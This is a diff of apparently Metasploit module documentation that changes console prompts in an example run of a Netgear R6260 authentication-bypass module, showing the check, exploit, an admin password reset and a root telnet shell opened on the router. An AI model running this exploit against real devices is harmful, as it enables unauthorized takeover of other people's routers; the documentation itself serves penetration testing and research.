@@ -54,8 +54,8 @@ This vulnerability was discovered and exploited by an independent security resea
 
 ### Netgear AC1600 aka R6260 with Firmware Version 1.1.0.40_1.0.1
 ```
-        msf6 > use auxiliary/admin/http/netgear_pnpx_getsharefolderlist_auth_bypass
-        msf6 auxiliary(admin/http/netgear_pnpx_getsharefolderlist_auth_bypass) > show options
+        msf > use auxiliary/admin/http/netgear_pnpx_getsharefolderlist_auth_bypass
+        msf auxiliary(admin/http/netgear_pnpx_getsharefolderlist_auth_bypass) > show options
 
         Module options (auxiliary/admin/http/netgear_pnpx_getsharefolderlist_auth_bypass):
 
@@ -68,13 +68,13 @@ This vulnerability was discovered and exploited by an independent security resea
         SSL      false            no        Negotiate SSL/TLS for outgoing connections
         VHOST                     no        HTTP server virtual host
 
-        msf6 auxiliary(admin/http/netgear_pnpx_getsharefolderlist_auth_bypass) > set RHOSTS 192.168.1.1
+        msf auxiliary(admin/http/netgear_pnpx_getsharefolderlist_auth_bypass) > set RHOSTS 192.168.1.1
         RHOSTS => 192.168.1.1
-        msf6 auxiliary(admin/http/netgear_pnpx_getsharefolderlist_auth_bypass) > check
+        msf auxiliary(admin/http/netgear_pnpx_getsharefolderlist_auth_bypass) > check
 
         [*] Target is a R6260 router running firmware version 1.1.0.40_1.0.1
         [*] 192.168.1.1:80 - The target appears to be vulnerable.
-        msf6 auxiliary(admin/http/netgear_pnpx_getsharefolderlist_auth_bypass) > exploit
+        msf auxiliary(admin/http/netgear_pnpx_getsharefolderlist_auth_bypass) > exploit
         [*] Running module against 192.168.1.1
 
         [*] Running automatic check ("set AutoCheck false" to disable)
@@ -92,7 +92,7 @@ This vulnerability was discovered and exploited by an independent security resea
         [*] Attempting to log in with admin:theRiverOfNope123!. You should get a new telnet session as the root user
         [*] Command shell session 1 opened (192.168.224.128:45717 -> 192.168.1.1:23) at 2021-09-23 16:38:53 -0500
         [*] Auxiliary module execution completed
-        msf6 auxiliary(admin/http/netgear_pnpx_getsharefolderlist_auth_bypass) > sessions -i 1
+        msf auxiliary(admin/http/netgear_pnpx_getsharefolderlist_auth_bypass) > sessions -i 1
         [*] Starting interaction with 1...
 
 
